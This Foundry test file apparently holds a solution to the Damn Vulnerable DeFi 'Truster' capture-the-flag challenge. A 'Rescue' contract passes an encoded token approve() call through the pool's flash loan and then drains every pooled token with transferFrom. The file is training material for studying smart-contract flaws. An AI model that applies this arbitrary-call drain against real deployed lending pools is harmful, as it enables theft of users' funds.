// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";



contract Rescue {
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    constructor (address _token, address _from, address _to, uint256 _amount) {
        //Set up
        token = DamnValuableToken(_token);
        pool = TrusterLenderPool(_from);
        

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _amount);

        require(pool.flashLoan(0, address(this), address(token), data));
        require(token.transferFrom(address(pool), address(_to), _amount));
        
    }

}


contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function get_token(address _from, uint256 _amount) public {
        assertEq(token.balanceOf(_from), _amount, "Insufficient balance");
        assertEq(token.allowance(_from, address(this)), _amount, "Insufficient allowance");
        token.transferFrom(_from, address(player), _amount);
    }

    function test_truster() public checkSolvedByPlayer {
        
        uint256 amount = TOKENS_IN_POOL;
        Rescue rescue;
        rescue = new Rescue(address(token), address(pool), address(recovery), amount);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
